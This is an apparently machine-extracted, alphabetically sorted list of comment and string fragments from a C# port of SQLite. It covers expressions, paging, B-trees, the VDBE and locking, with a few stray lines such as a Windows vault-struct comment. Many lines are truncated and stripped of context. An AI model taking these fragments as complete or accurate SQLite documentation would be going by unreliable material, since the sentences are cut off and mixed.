 Expanding a SELECT statement is the first step in processing a
 Expected number of pages in the list 
 Expected pointer map parent page number 
 Expected pointer map type 
 Explicit use of the CROSS keyword 
 Exponentional notation. %e and %E 
 Exported version of applyAffinity(). This one works on sqlite3_value
 Expr in which substitution occurs 
 Expr list from which to derive column names 
 Expr objects can use a lot of memory space in database schema.  To
 Expr struct is EXPR_REDUCEDSIZE bytes only 
 Expr struct is EXPR_TOKENONLYSIZE bytes only 
 Expr.flags field.
 Expr.iColumn is the column number for the specific column.  If the
 Expr.op is the opcode.  The integer parser token codes are reused
 Expr.pRight and Expr.pLeft are the left and right subexpressions of a
 Expr.x.pSelect is used if the expression is a sub-select or an expression of
 Expr.x.pSelect member has a height of 1. Any other expression
 ExprSpan.zEnd values of pOut so that the span covers the complete
 Expression <column> 
 Expression contains one or more errors 
 Expression defining the new record number 
 Expression encoding the function 
 Expression for a single result column 
 Expression list contaning only pSelectRowid 
 Expression opcode 
 Expression to be appended. Might be NULL 
 Expression to pass to authorization callback 
 Expression tree height of current sub-select 
 Expression used to recompute the rowid 
 Expression we are trying to match 
 Expressions defining the result set 
 Expressions of the form:   CAST(pLeft AS token) 
 Extension loading is off by default. See ticket 
 Extensions that use newer APIs should first call the
 External API function used to create a new virtual-table module.
 Extra bytes append to each in-memory page 
 Extra content 
 Extra data for callback 
 Extra information if eOperator==WO_AND 
 Extra information if eOperator==WO_OR 
 Extra memory used for etTCLESCAPE conversions 
 Extra space associated with each page 
 Extra zero bytes to append to pData 
 Extract a leaf from the trunk 
 Extract the smallest element from the RowSet.
 Extract the smallest value from boolean index P1 and put that value into
 Extract the user data from a sqlite3_context structure and return a
 Extract the value of R from register P3. 
 Extract the values to be compared.
 FAIL 
 FALSE
 FALSE if each
 FILETIME structure is a 64-bit value representing the number of
 FILE_ATTRIBUTE_HIDDEN
 FILE_FLAG_DELETE_ON_CLOSE
 FILE_SHARE_WRITE
 FIX ME:
 FIX ME:  Compute pExpr.affinity based on the expected return
 FIX ME: It would be better if sqlite3_snprintf() could do UTF-16.
 FIX ME: This should be allocated as part of the vdbe at compile-time 
 FKey pNextFKey
 FLAG_INTERN ) == 0 )
 FLAG_SIGNED ) != 0 )
 FLAG_STRING ) == 0 )
 FLOA 
 FOR 
 FOREIGN 
 FORM clause entry is iTable.  This routine make the necessary
 FORMAT DETAILS
 FROM 
 FROM ' 
 FROM <table2>
 FROM clause cannot contain a subquery 
 FROM clause does not contain a real table 
 FROM clause is not a view 
 FROM clause must have exactly one term 
 FROM clause not a virtual table 
 FROM clause of SELECT statement p.  Do not invoke the select
 FROM clause of a SELECT such that the VDBE cursor assigned to that
 FROM clause of subquery 
 FROM clause of the outer query 
 FROM clause term being coded 
 FROM is not a subquery or view 
 FROM one
 FROM subqueries have Table metadata 
 FROM t1 LEFT JOIN t2 ON t1.a=t2.b AND t1.x=5
 FROM t1 LEFT JOIN t2 ON t1.a=t2.x AND t2.z='ok'
 FROM t1 LEFT JOIN t2 ON t1.a=t2.x WHERE t2.z='ok'
 FROM t1 WHERE (select a from t1)
 FROM t1 WHERE a
 FROM t1 WHERE a=5 OR b=7 OR (c=11 AND d=13)
 FROM t2 WHERE t2.x>0)
 FROM tab2
 FROM temp.ex1
 FROM two
 FROM xxx
 FULL 
 FUNCTIONS
 Factors that influence cost include:
 Fail the operation and rollback the transaction 
 Failed to find the required lock. 
 Fails on a lookaside memory leak 
 Failure is not possible.  This function always returns SQLITE_OK.
 Failure to set the bits in the InJournal bit-vectors is benign.
 Fake SrcList for pParse.pNewTable 
 Fake token for an empty ID list 
 Fall through 
 Fall through into OP_Halt 
 Fall through into OP_Rewind 
 Fall through into the next case 
 Fall through into the next case if the '
 Fall thru 
 Fall thru into abort_due_to_error 
 Fall thru into the default case 
 Fall thru into the next case 
 Fallback token 
 False to disable new lookaside allocations 
 False to omit journal 
 Fetch a page by key value.
 Fetch the info entry for the field 
 Fetch the integer off the end of the index record 
 Few opcodes use all 5 operands.
 Fewer features 
 Fields in this structure are accessed under the BtShared.mutex
 Fifth parameter is an unsigned character 
 Figure out how many bytes are in the header 
 Figure out how many bytes of space are required to store explicitly
 Figure out how many columns of data are supplied.  If the data
 Figure out how many memory cells we will need then allocate them.
 Figure out how many records are in the journal.  Abort early if
 Figure out how many savepoints will still be active after this
 Figure out how much space is required for each journal file-handle
 Figure out if we have any triggers and if the table being
 Figure out the affinity to use to create a key from the results
 Figure out the collation sequence required from an index for
 Figure out the db that the the trigger will be created in 
 Figure out the number of pages needed to hold all nCell cells.
 Figure out the root-page that the lock should be held on. For table
 Figure out what version of the code to use.  The choices are
 Figure out where to write the new Expr structure. 
 File Locking Notes:  (Mostly about windows but also some info for Unix)
 File descriptor for database 
 File descriptor for main journal 
 File descriptor for sub-journal 
 File format to use for encoding 
 File opened that is not a database file 
 File size in bytes returned by OsFileSize() 
 File to read from 
 File to write into 
 File-name for the master journal 
 FileAccess.Write
 FileAttributes.ReadOnly ) != 0 
 FileShare.Write
 Filename        NULL            
 Filename in OS encoding 
 Filename in UTF-8 encoding 
 Filestream access to this file
 Fill in pNew.pLeft and pNew.pRight. 
 Fill in the header. 
 Fill in the pNew.x.pSelect or pNew.x.pList member. 
 Fill in the payload 
 Fill in this structure 
 Fill the Index.aiRowEst[] array with default information - information
 Fill the InitData structure with an error message that indicates
 Fill the index with data and reparse the schema. Code an OP_Expire
 Final cleanup
 Final subterm within the OR-clause. 
 Finalize the journal file. 
 Find a dirty page to write-out and recycle. First try to find a
 Find a page in the hash table given its page number. Return
 Find an empty slot and replace it 
 Find and return the schema associated with a BTree.  Create
 Find any inequality constraint terms for the start and end
 Find out what action to take in case there is an indexing conflict 
 Find out what flags are present 
 Find the appropriate action for a parser given the non-terminal
 Find the appropriate action for a parser given the terminal
 Find the column for which info is requested 
 Find the current time (in Universal Coordinated Time).  Write the
 Find the index cursor. 
 Find the memory cell that will be used to store the blob of memory
 Find the name of the index.  Make sure there is not already another
 Find the next available sequence number for cursor P1.
 Find the query plan for accessing a particular table.  Write the
 Find the query plan for accessing table pSrc.pTab. Write the
 Find the sibling pages to balance. Also locate the cells in pParent
 Find the table that is to be indexed.  Return early if not found.
 Finding a particular key requires reading O(log(M)) pages from the
 Finish committing the transaction to the destination database. 
 Finish off a string by making sure it is zero-terminated.
 Finish the loop through table entries that match term pOrTerm. 
 Finite column numbers 
 Fire BEFORE or INSTEAD OF triggers 
 Fires if INSERT after SMALLEST 
 First Mem address for previous GROUP BY 
 First Mem address for storing current GROUP BY 
 First allowable cell index 
 First allowable cell or freeblock offset 
 First arg to busy callback 
 First arg to comparison function 
 First arg to xCompare() 
 First argument to compare function 
 First argument to disposal method 
 First argument to the function 
 First argument to xCallback() 
 First argument to xCmp() 
 First argument to xCodec... methods 
 First byte of UTF-8 character 
 First byte of available memory space 
 First byte of cell content area 
 First byte of gap between cell pointers and cell content 
 First byte of the cell content area 
 First byte past end of available space 
 First byte past the last cell pointer in data[] 
 First character of input text 
 First element 
 First element already in pEntry 
 First field to be combined into the record 
 First instruction of interior of the loop 
 First namecontext in the list 
 First operand 
 First page of the database 
 First page of the sector pPg is located on. 
 First part of [database.]id field 
 First part of index name. May be NULL 
 First part of the name of the table or view 
 First register in set passed to OP_VUpdate 
 First register in temporary register block 
 First register to which to apply affinity 
 First replace any existing entry 
 First search for a match amongst the application-defined functions.
 First search the list for an existing lock on this table. 
 First sorted list to be merged 
 First table 
 First time through the loop 
 First unused FROM clause element 
 First unused byte of aOvflSpace[] 
 First unused byte of aSpace1[] 
 First we attempt to find the largest existing rowid and add one
 Fix the database pointer on page iPtrPage that pointed at iDbPage so
 Fix the pointer-map entries for all the cells that were shifted around.
 Flag to indicate when select-A is complete 
 Flag to indicate when select-B is complete 
 Flags 
 Flags Debug.Associated with pProbe 
 Flags appropriate for the wctrlFlags parameter of sqlite3WhereBegin()
 Flags associated with this schema 
 Flags for sqlite3_vfs.xOpen() 
 Flags originally passed to sqlite3WhereBegin() 
 Flags passed through to VFS open 
 Flags passed through to sqlite3_vfs.xOpen() 
 Flags passed through to the VFS 
 Flags passed through to vfsOpen 
 Flags passed to sqlite3_vfs.xOpen() 
 Flags passed to the sqlite3ExprDup() function. See the header comment
 Flattening is only attempted if all of the following are true:
 Floating point sum 
 Floating point.  %f 
 Followed by (JOURNAL_HDR_SZ - 28) bytes of unused space.
 For MS SqlServer compatibility 
 For MySQL compatibility 
 For a non-purgeable cache (a cache used as the storage for an in-memory
 For a term of the form x=EXPR or x IS NULL we only have to do
 For assigning database names to pTable 
 For columns use the column name name 
 For comparing with previous entry 
 For compatibility with MS SQL Server 
 For each aggregate function 
 For each column used in source tables 
 For every Btree that in database connection db which
 For example those parameters only used in assert() statements. In these
 For following code (kept for historical record only) shows an
 For looping over FROM tables 
 For looping over all elements of the table 
 For looping over existing elements 
 For looping over expression in a list 
 For looping over indices 
 For looping over indices of the table 
 For looping over pList 
 For looping over result columns 
 For looping over tables in pDb 
 For looping through SELECT statements 
 For looping through pKeyInfo.aColl[] 
 For operators other than UNION ALL we have to make sure that
 For shared-cache mode 
 For storing row data of OLD table 
 For storing the record being decoded 
 For temporary files the effective sector size is always 512 bytes.
 For testing and debugging use only 
 For the limit category of SQLITE_LIMIT_XYZ there is a 
 Force an SQLITE_TOOBIG error. 
 Force the value in register P1 be an integer.  If
 Force the value in register P1 to be a BLOB.
 Force the value in register P1 to be a floating point number.
 Force the value in register P1 to be an integer.  If the value
 Force the value in register P1 to be numeric (either an
 Force the value in register P1 to be text.
 Form 1 causes all indices in all attached databases to be analyzed.
 Form 1 causes all indices in all attached databases to be rebuilt.
 Form 1:  Analyze everything 
 Form 2 analyzes all indices the single database named.
 Form 2 rebuilds all indices in all databases that use the named
 Form 2:  Analyze the database or table named 
 Form 3 analyzes all indices associated with the named table.
 Form 3: Analyze the fully qualified table name 
 Form A is can be transformed into the equivalent form B as follows:
 Form A:
 Form B:
 Format string 
 FormatMessage returns 0 on failure.  Otherwise it
 Forms a linked list of all cursors 
 Forward Declaration 
 Forward Declarations 
 Forward declaration 
 Forward declaration required by incrVacuumStep(). 
 Forward declarations 
 Forward declarations of structure
 Forward declarations of structures. 
 Forward prototypes.
 Forward reference
 Forward reference 
 Forward references to internal structures 
 Forward references to structures
 Fractional Days 
 Free a WhereInfo structure
 Free a dynamic mutex.
 Free a page object allocated by pcache1AllocPage().
 Free a prior allocation 
 Free all resources held by the schema structure. The void
 Free all structures in the Pager.aSavepoint[] array and set both
 Free allocated structure 
 Free an allocated buffer obtained from pcache1Alloc().
 Free an allocated buffer obtained from sqlite3PageMalloc().
 Free an sqlite3_value object
 Free any existing lookaside buffer for this handle before
 Free any old pages that were not reused as new pages.
 Free any outstanding Savepoint structures. 
 Free any overflow pages associated with the given Cell.
 Free block is off the page 
 Free blocks must be in ascending order 
 Free idxStr using sqlite3_free() if true 
 Free memory previously obtained from sqlite3Malloc().
 Free memory that might be associated with a particular database
 Free memory.
 Free page blocks 
 Free slots in the allocator used to divide up the buffer provided using
 Free the pBt.pTmpSpace allocation
 Free this register when done 
 Free this when deleting the vdbe 
 Free-list trunk page 
 Freelist pages come in two subtypes: trunk pages and leaf pages.  The
 Fsync the rollback journal before
 Full path to database file 
 Full size 
 FuncDef wrapper for detachFunc() or attachFunc() 
 FuncDef.pHash elements at start-time.  The elements of this array
 Function [sqlite3_backup_step()] is used to copy up to nPage pages between 
 Function assertTruncateConstraint(pPager) checks that one of the 
 Function calls are checked to make sure that the function is
 Function context 
 Function prototypes
 Function sqlite3Error() should be used during statement execution
 Function to call when busy 
 Function to invoke on each commit 
 Function to possibly overload 
 Function to reinitialize pages 
 Function used to reclaim memory 
 Functions for accessing sqlite3_file methods
 Functions for accessing sqlite3_vfs methods
 Functions to support testing and debugging. 
 Functions used to configure a Pager object. 
 Functions used to manage pager transactions and savepoints. 
 Functions used to obtain and release page references. 
 Functions used to query pager state and configuration. 
 Functions used to truncate the database file. 
 Fx 
 GCC does not define the offsetof() macro so we'll have to do it
 GCC might have just copying the problem from a prior compiler.
 GENERIC_WRITE
 GLOB 
 GOTO label for end of CASE stmt 
 GOTO label for next WHEN clause 
 GROUP 
 GROUP BY clause.
 Gather the complete text of the CREATE INDEX statement into
 General Implementation Functions 
 General Interfaces 
 Generate VDBE code for zero or more statements inside the body of a
 Generate VDBE code that prepares for doing an operation that
 Generate VDBE code that will verify the schema cookie and start
 Generate a CREATE TABLE statement appropriate for the given
 Generate a coroutine to evaluate the SELECT statement on
 Generate a coroutine to evaluate the SELECT statement to the
 Generate a select expression tree to enforce the limit/offset
 Generate a single row of result 
 Generate a subroutine that outputs a single row of the result
 Generate a subroutine that outputs the current row of the A
 Generate a subroutine that outputs the current row of the B
 Generate a subroutine that will reset the group-by accumulator
 Generate a subroutine to run when the results from select A
 Generate a subroutine to run when the results from select B
 Generate an ORDER BY or GROUP BY term out-of-range error.
 Generate an error message when a SELECT is used within a subexpression
 Generate an instruction that will put the floating point
 Generate an instruction that will put the integer describe by
 Generate and return single random u8
 Generate code for a DELETE FROM statement.
 Generate code for a boolean expression such that a jump is made
 Generate code for a comparison operator.
 Generate code for a single equality term of the WHERE clause.  An equality
 Generate code for all sub-queries in the FROM clause
 Generate code for an UPDATE of a virtual table.
 Generate code for scalar subqueries used as an expression
 Generate code for the ANALYZE command.  The parser calls this routine
 Generate code for the REINDEX command.
 Generate code for the SELECT statement given in the p argument.
 Generate code for the left and right SELECT statements.
 Generate code for the start of the iLevel-th loop in the WHERE clause
 Generate code into the current Vdbe to evaluate the given
 Generate code into this VDBE 
 Generate code into this VM 
 Generate code into this virtual machine 
 Generate code that evalutes the given expression and puts the result
 Generate code that executes if the new index entry is not unique 
 Generate code that pushes the value of every element of the given
 Generate code that runs whenever the GROUP BY changes.
 Generate code that will assemble an index key and put it in register
 Generate code that will cause the most recent index analysis to
 Generate code that will do an analysis of a single table in
 Generate code that will do an analysis of an entire database
 Generate code that will erase and refill index pIdx.  This is
 Generate code that will evaluate all == and IN constraints for an
 Generate code that will evaluate expression pExpr and store the
 Generate code that will extract the iColumn-th column from
 Generate code that will increment the schema cookie.
 Generate code that will open a table for reading.
 Generate code that will open cursors for a table and for all
 Generate code that will tell the VDBE the declaration types of columns
 Generate code that will tell the VDBE the names of columns
 Generate code to check constraints and generate index keys and
 Generate code to copy content from registers iFrom...iFrom
 Generate code to destroy the database record of the trigger.
 Generate code to do an analysis of all indices associated with
 Generate code to do constraint checks prior to an INSERT or an UPDATE.
 Generate code to drop and reload the internal representation of table
 Generate code to evaluate all constraint terms using == or IN
 Generate code to evaluate an expression and store the results
 Generate code to handle the case of A<B
 Generate code to handle the case of A==B
 Generate code to handle the case of A>B
 Generate code to make sure the file format number is at least minFormat.
 Generate code to move content from registers iFrom...iFrom
 Generate code to remove the index and from the master table 
 Generate code to remove the table from the master table
 Generate code to return a single integer value.
 Generate code to scan the ephemeral table and call VUpdate. 
 Generate code to store the value of the iAlias-th alias in register
 Generate code to take the intersection of the two temporary
 Generate code to this VDBE 
 Generate code to write the results of the select into the temporary
 Generate loop termination code.
 Generate new record numbers semi-randomly 
 Generate the NEW table
 Generate the OLD table
 Generate the beginning of the loop used for WHERE clause processing.
 Generate the code for triggers.
 Generate the code to do the search.  Each iteration of the for
 Generate the end of the WHERE loop.  See comments on
 Generate the operands for a comparison operation.  Before
 Generate the subroutine return
 Generate the text of a WHERE expression which can be used to select all
 Generic pointer 
 Get a NULL terminated version of the new table name. 
 Get a VDBE for the given parser context.  Create a new one if necessary.
 Get a page from the pager and initialize it.  This routine is just a
 Get a page from the pager.  Initialize the MemPage.pBt and
 Get a reference to pPage1 of the database file.  This will
 Get a single 8-bit random value from the RC4 PRNG.  The Mutex
 Get an EXCLUSIVE lock on the database file. At this point it is
 Get an appropriate name for the column
 Get or set the size limit on rollback journal files.
 Get or set the value of the database 'auto-vacuum' parameter.
 Get the VDBE program ready for execution
 Get the conversion type modifier 
 Get the database meta information.
 Get the field width 
 Get the precision 
 Get the sector size of the device used to store
 Get the size of the index entry.  Only indices entries of less
 Get the suggested cache-size value.
 Get/set the journal-mode for this pager. Parameter eMode must be one of:
 Get/set the locking-mode for this pager. Parameter eMode must be one
 Get/set the size-limit used for persistent journal files.
 GetFileAttributesW(pFile.zDeleteOnClose)!=0xffffffff
 GetLastError() and FormatMessage() on windows (or errno and
 GetLastError()!=NO_ERROR ){
 GetMeta() and UpdateMeta() cannot fail in this context because
 GitHub
 GitHub.url
 Give a listing of the program in the virtual machine.
 Give no warning for recursive triggers.  Just do not do them 
 Given a an expression list (which is really the list of expressions
 Given a btree page and a cell index (0 means the first cell on
 Given the page number of an overflow page in the database (parameter
 Global data for the page cache.
 Global shared lock memory for the file  
 Global variables.
 Globbing rules:
 Go back under the static mutex and clean up the recursive
 Gosub opcode and jumps straight to the code generated by WhereEnd().
 Grab the index number and argc parameters 
 Grave-accent quoted symbols used by MySQL 
 Grow the Pager.aSavepoint array using realloc(). Return SQLITE_NOMEM
 Grow the sqlite3.aVTrans array if required 
 Guaranteed to be too big if greater than 19 digits 
 Guaranteed to fit if less than 19 digits 
 Guess that rowid<EXPR eliminates two-thirds of rows 
 Guess that rowid>EXPR eliminates two-thirds of rows 
 HAVE_USLEEP
 HAVING 
 Hack:  The TK_AS operator is inhibited if zType[0]=='G'.  This means
 Halt if out of errors 
 Handle for accessing the blob returned here 
 Handle for accessing the file 
 Handle for sqlite3DbMallocZero() (may be null) 
 Handle that must hold lock 
 Handle to return 
 Handle type for pages.
 Has a child 
 Has no GROUP BY clause 
 Has no LIMIT clause 
 Has no WHERE clause 
 Hash each FuncDef structure into one of the FuncDefHash.a[] slots.
 Hash of page content 
 Hash of the name 
 Hash score: 171 
 Hash table for fast lookup by pgno 
 Hash table for functions 
 Hash table for global functions - functions common to all
 Hash table of all pages. The following variables may only be accessed
 Hash table of connection functions 
 Hash table representation 
 Hash table to search 
 Hash value 
 Hash value for the element 
 Hash.first points to the head of this list.
 Hash.ht table is never allocated because if there are few elements
 Hash.htsize and Hash.ht may be zero.  In that case lookup is done
 Hashing function for the aHash representation.
 Head of a linked list of all sqlite3 objects created by this process
 Head of in-memory chunk-list 
 Header file for the Virtual DataBase Engine (VDBE)
 Heap storage space 
 Height of the tree headed by this node 
 Held in memory not obtained from malloc() 
 Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct 
 Hence it is only available in debug builds.
 Here code is inserted which will be executed whenever the
 Here code is inserted which will execute if the parser
 Here ends the I/O methods that form the sqlite3_io_methods object.
 Here is inserted the actions which take place when a
 Higher-level routines never call this function if database is not
 Highwater mark for nOut 
 Hints: to match '
 Holding area for temporary registers 
 Holding variable for allocated memory 
 Holds the assemblied row record 
 Honor DESC 
 Hour and minutes 
 How many pages in the page cache 
 How to deal with SELECt result 
 How to dispose of results 
 How to dispose of the results 
 How to handle constraint errors 
 How to resolve conflicts that occur on DELETE 
 How to resolve conflicts that occur on INSERT 
 How to resolve conflicts that occur on UPDATE 
 However it has been discovered that on some systems this pattern can
 However the ON CONFLICT clauses are different. If both this
 I am also told that newer versions of GCC that follow a different
 I/O active are written using this function.  These messages
 I/O error mechanism.  These routines are used to avoid simulated
 I/O methods on journal files 
 I/O operations on the open file.
 ICU extension.  All it does is declare the sqlite3IcuInit() interface.
 IDs have been resolved to COLUMNs 
 IEEE floating point 
 IF 
 IGNORE 
 IMMEDIATE 
 IMPORTANT:  Changing the PENDING byte from 0x40000000 results in
 IMPORTANT:  Changing the pending byte to any value other than
 IN 
 IN operator because one or more terms in the OR clause contain
 IN/OUT: Allocate from 
 IN/OUT: Set 
 INDEX 
 INDEXED 
 INITIALLY 
 INNER 
 INPUTS:
 INSERT 
 INSERT STACK UNION HERE 
 INSERT continues to completion after deleting rows that caused
 INSERTs.  RowidChng means that the new rowid is explicitly specified by
 INSTEAD 
 INSTEAD OF trigger into a BEFORE trigger.  It simplifies code
 INSTEAD OF triggers can only appear on views and BEFORE triggers
 INSTEAD of triggers are only for views and views only support INSTEAD
 INT 
 INTEGER PRIMARY KEY column.  Table.iPKey is set to -1 if there is
 INTERSECT
 INTERSECT 
 INTERSECT is different from the others since it requires
 INTKEY table currently pointing at a valid table entry.
 INTO 
 IN_DECLARE_VTAB ) goto fk_end
 IN_DECLARE_VTAB ) goto primary_key_exit
 IN_DECLARE_VTAB ){
 IS 
 ISNULL 
 ISNULL constraints will then not be used on the right table of a left
 IdChar( (u8)zSql[zIdx 
 IdChar(X) will be true.  Otherwise it is false.
 Identifiers have been resolved 
 Identify column names if results of the SELECT are to be output.
 If AUTOVACUUM is disabled then a zero is stored in register P2.
 If AUTOVACUUM is enabled and the page at iTable is not the last
 If AUTOVACUUM is enabled then it is possible that another root page
 If Expr.op==TK_AGG_COLUMN or TK_AGG_FUNCTION then Expr.pAggInfo is a
 If K==0 then no entry is made into the sqlite_stat1 table.
 If K>0 then it is always the case the D>0 so division by zero
 If ORDER BY makes no difference in the output then neither does
 If P2==1 then no insert is performed.  argv[0] is the rowid of
 If P3>0 then P3 is a register that holds the largest previously
 If P4 is NULL then all index fields have the affinity NONE.
 If P4 is not NULL then the P1 cursor must have been positioned
 If P4 is not null then it is an error message string.
 If P5 is non-zero then the key value is increased by an epsilon
 If P5 is non-zero then the key value is increased by an epsilon prior
 If SQLITE_CHECK_PAGES is defined then we do some sanity checking
 If SQLite has not been initialized using [sqlite3_initialize()] prior 
 If SQLite is compiled and configured to support threadsafe database
 If SQLite is compiled with the SQLITE_MUTEX_APPDEF preprocessor
 If WhereMaskSet.ix[A]==B it means that The A-th bit of a Bitmask
 If X and Y are NULL (in other words if only the column name Z is
 If X is a character that can be used in an identifier then
 If [0] is unused then [1] is also unused.  So we can
 If [sqlite3_step()] or [sqlite3_reset()] or [sqlite3_finalize()]
 If a NOT INDEXED clause (pSrc.notIndexed!=0) was attached to the table
 If a child journal can be found that matches both of the criteria
 If a collation sequence is Debug.Associated with either the left or right
 If a column is marked as 'hidden' (currently only possible
 If a master journal file name is present at the end of the journal
 If a memory allocation error has occurred prior to the calling of this
 If a memory allocation error occurs during the evaluation of any
 If a memory allocation fails the SrcList is unchanged.  The
 If a register is allocated and its location stored in 
 If a separate thread makes changes on the same database connection
 If a separate thread performs a new [INSERT] on the same
 If a term in the WHERE clause does not match either of the two previous
 If addr<0 then change P4 on the most recently inserted instruction.
 If all subterms are of the form T.C=expr for some single column of C
 If an SQL operation is very nearly finished at the time when
 If an entry that matches the value in register p3 exists in P1 then
 If an error occurs an SQLite error code is returned. Otherwise:
 If an expression contains aggregate functions then the EP_Agg
 If an index can be used so that the natural output order of the table
 If an index column fails to match and is not constrained by ==
 If an index column that is constrained by == fails to match an
 If an initial attempt to acquire the lock fails because of lock contention
 If an internal allocation is requested that would exceed the
 If another database handle has already opened a write transaction
 If another thread changes the autocommit status of the database
 If any of the N registers beginning with register P4 contains a NULL
 If any of the following errors occur:
 If any of these routines are called after [sqlite3_reset()] or
 If auto-vacuum is disabled in this build and this is an auto-vacuum
 If certain kinds of errors occur on a statement within a multi-statement
 If collation sequence pColl was created directly by a call to
 If db!=0 and db->mallocFailed is true (indicating a prior malloc
 If doTruncate is non-zero or the Pager.journalSizeLimit variable is
 If either P1 or P2 is 0 (false) then the result is 0 even if
 If either P1 or P2 is nonzero (true) then the result is 1 (true)
 If either operand is NULL then the result is always NULL.
 If either the P1 or P2 text are NULL then store NULL in P3.
 If flattening is attempted this routine returns 1.
 If iDb<0 then code the OP_Goto only - don't set flag to verify the
 If iDb==0 then reset the internal schema tables for all database
 If iSize>BITVEC_NBIT and iDivisor==0 then Bitvec.u.aHash[] is
 If inMultiplier is an estimate and that estimate results in an
 If it is determined that no master journal file name is present
 If malloc() failed during an encoding conversion within an
 If n==P4_KEYINFO it means that zP4 is a pointer to a KeyInfo structure.
 If nRec is 0 and this rollback is of a transaction created by this
 If no destructor action specified: do nothing 
 If no test above fails then the indices must be compatible 
 If non-zero free this temporary register 
 If p is NULL (if the bitmap has not been created) or if
 If pBt points to an empty file then convert that empty file
 If pColl == null then recompute all indices of pTab.
 If pExpr is a constant expression that is appropriate for
 If pFrom is currently carrying any overflow cells (entries in the
 If pName==0 it means that we are
 If pRC is initially non-zero (non-SQLITE_OK) then this routine is
 If pRoot==NULL that means that a memory allocation error has occurred.
 If pStart is not NULL then it is sz
 If pTblName==0 it means this index is generated as a primary key
 If pToRelease is not zero than pPayload points into the data area
 If pToRelease is not zero than pPrior points into the data area
 If pWalker.u.i is 3 then any term of the expression that comes from
 If pzTail is not NULL then 
 If regPrev>0 then it is a the first register in a vector that
 If register P1 holds an integer convert it to a real value.
 If sorting index that was created by a prior OP_OpenEphemeral
 If sqlite3BtreeDropTable was called on page 1.
 If sqlite3PagerPagecount() fails there is no harm because the
 If sqlite3StartTable return non-NULL then
 If sqlite3_malloc() fails during the processing of either routine
 If sqlite3_malloc() is unable to obtain sufficient free
 If tables do not have an INTEGER PRIMARY KEY and there
 If the 'exact' parameter was true and a query of the pointer-map
 If the 3rd parameter to sqlite3_open_v2() is not one of the
 If the 3rd parameter to the sqlite3_result_text
 If the 4th parameter to the sqlite3_result_text
 If the CREATE VIRTUAL TABLE statement is being entered for the
 If the DISTINCT keyword was present on the SELECT statement
 If the EP_Reduced and EP_TokenOnly flags are set when
 If the ExprList is an ORDER BY or GROUP BY clause then the resulting
 If the MEM_Str flag is set then Mem.z points at a string representation.
 If the Nth column returned by the statement is an expression or
 If the ORDER BY clause contains only columns in the current
 If the P1 cursor must be pointing to a valid row (not a NULL row)
 If the P1 index entry is greater than or equal to the key value
 If the P1 index entry is less than the key value then jump to P2.
 If the P3 value could not be converted into an integer without
 If the PGHDR_NEED_SYNC flag is set for any of the nPage pages
 If the PREFIX_SEARCH flag is set and all fields except the final
 If the SQL column is blank it means this is an index that
 If the SQL statement in the 2nd parameter is NULL or an empty string
 If the SQLITE_ENABLE IOTRACE exists then the global variable
 If the SQLITE_JUMPIFNULL bit of P5 is set and either reg(P1) or
 If the VM did not run to completion or if it encountered an
 If the VdbeCursor.isTriggerRow flag is set it means that this cursor is
 If the Walker does not have an xSelectCallback() then this routine
 If the [BLOB handle] passed as the first argument was not opened for
 If the [threading mode] is Single-thread or Multi-thread then this
 If the [unprotected sqlite3_value] object returned by
 If the above search did not find a BtLock struct associating Btree p
 If the action code is [SQLITE_DELETE] and the callback returns
 If the action code is [SQLITE_READ]
 If the auto-commit flag is set and this is the only active writer
 If the blocked connection is attempting to obtain a write-lock on a
 If the caller happens to have a pointer to the MemPage object
 If the caller is an UPDATE or DELETE statement that is requesting
 If the cell was originally divider cell (and is not now) or
 If the collation sequence
 If the contents of this page were just restored from the main
 If the cost of scanning using this OR term for optimization is
 If the createFlag parameter is true and the search did not reveal an
 If the current number of pages in the file is greater than the
 If the current size of the database file is 0 but a journal file
 If the cursor is already pointing to the correct row and that row has
 If the cursor is already positioned at the point we are trying
 If the database connection closes while [sqlite3_interrupt()]
 If the database connection is currently in autocommit mode (that
 If the database image is smaller than the requested page or if a
 If the database is already opened in the same database connection
 If the database may be auto-vacuum capable (if SQLITE_OMIT_AUTOVACUUM
 If the db.init.busy is 0 then create the index on disk.  This
 If the db.init.busy is 1 it means we are reading the SQL off the
 If the default value for the new column was specified with a
 If the either the page-size or sector-size in the journal-header is
 If the error occurs during the first call to
 If the expression evaluates to NULL (neither true nor false) then
 If the expression is a subquery then Expr.iColumn holds an integer
 If the expression is an unbound variable marker (a question mark
 If the expression is not constant then we will need to
 If the expression p codes a constant integer that is small enough
 If the file is currently unlocked then the size must be unknown 
 If the file opened as the journal file is not a well-formed
 If the following function pointer is not NULL and if
 If the following global variable points to a string which is the
 If the free-list must be searched for 'nearby' 
 If the given Mem
 If the iFix!=null then the pageSizeFixed flag is set so that the page size
 If the index value yy_shift_ofst[S]
 If the indexed column is the primary key and everything matches
 If the input is of the form Z (not Y.Z or X.Y.Z) then the name Z
 If the isIncrblobHandle flag is set and the BtCursor.aOverflow[]
 If the journal needs to be sync()ed before page pPg.pgno can
 If the last instruction coded is an ephemeral copy of any of
 If the library is compiled to omit the full-scale date and time
 If the locking level of the file descriptor is already at or below
 If the memory cell contains a string value that must be freed by
 If the memory cell currently contains string or blob data
 If the nBytes parameter is 0 and the blob of memory has not yet been
 If the nRec value is 0xffffffff it means that nRec should be computed
 If the operating system does not support sleep requests with
 If the option is unknown or SQLite is unable to set the option
 If the order-by term is an integer I between 1 and N (where N is the
 If the overflow page-list cache has been allocated and the
 If the pBase expression originated in the ON or USING clause of
 If the pSrc table is the right table of a LEFT JOIN then we may not
 If the padFlag argument is not NULL then space padding at the end
 If the page being moved is dirty and has not been saved by the latest
 If the page number of the page record read from the (sub-)journal file
 If the page number of this page is larger than the current size of
 If the page record is successfully read from the (sub-)journal file
 If the pager is a temp-file pager and the actual file-system file
 If the pager is in PAGER_SHARED or PAGER_UNLOCK state when this
 If the pager object is allocated and the specified file opened
 If the pluggable cache (sqlite3_pcache
 If the previous instruction was a copy of the previous unnamed
 If the record is being rolled back from the main journal file
 If the requested page number was either 0 or greater than the page
 If the result is a BLOB or UTF-8 string then the sqlite3_column_bytes()
 If the result is a numeric value then sqlite3_column_bytes() uses
 If the result is not a simple column reference (if it is an expression
 If the return value of sqlite3BtreeGetFilename() is a zero length
 If the row that a BLOB handle points to is modified by an
 If the schema-cookie from the database file matches the cookie
 If the second parameter to sqlite3_realloc() is zero or
 If the source-list item passed as an argument was augmented with an
 If the sqlite3_index_info structure has not been previously
 If the statement is of the form
 If the string is too large (if it exceeds the SQLITE_LIMIT_LENGTH
 If the string zSignedIdent consists entirely of alpha-numeric
 If the table being dropped is the table with the largest root-page
 If the table has an INTEGER PRIMARY KEY column and that column
